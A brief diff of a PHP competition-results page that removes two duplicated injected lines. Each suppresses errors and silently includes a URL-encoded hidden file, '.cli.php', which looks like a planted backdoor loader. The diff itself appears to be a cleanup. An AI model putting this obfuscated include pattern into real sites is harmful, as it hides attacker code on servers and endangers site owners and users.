@@ -1,7 +1,3 @@
-<?php error_reporting(0);
-@include_once(urldecode("%2E%63%6C%69%2E%70%68%70")); ?>
-<?php error_reporting(0);
-@include_once(urldecode("%2E%63%6C%69%2E%70%68%70")); ?>
 <?php include('include/pagetop.php'); ?>
 <?php include('include/class.Results.php'); ?>
 <h1>2025 Competition</h1>
